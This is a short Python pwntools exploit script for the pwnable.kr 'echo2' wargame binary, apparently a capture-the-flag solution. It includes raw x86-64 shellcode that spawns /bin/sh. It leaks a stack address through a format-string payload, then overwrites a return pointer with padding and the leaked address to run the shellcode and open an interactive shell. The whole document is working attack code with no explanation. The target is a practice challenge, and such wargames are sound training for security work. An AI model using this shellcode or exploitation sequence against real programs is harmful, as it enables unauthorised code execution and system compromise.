from pwn import *

s = process("./echo2")
s = remote("pwnable.kr", 9011)
e = ELF("./echo2")

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
print len(shellcode)
s.recvuntil(" : ")
s.sendline(shellcode)

s.recvuntil(">")
s.sendline("2")

s.recvuntil("hello")
s.sendline("%p%p%p%p%p%p%p%p%p%p")
goodbye= s.recvuntil("goodbye")
stack= goodbye[-22:-8]
stack = int(stack,16)
stack = stack-0x20
s.recvuntil(">")
s.sendline("4")
s.sendline("n")

s.recvuntil(">")
s.sendline("2")
s.recvuntil("hello")
s.sendline(shellcode)
s.recvuntil(">")
s.sendline("3")
s.recvuntil("hello")
payload = "A"*24
payload += p64(stack)
s.send(payload)

s.interactive()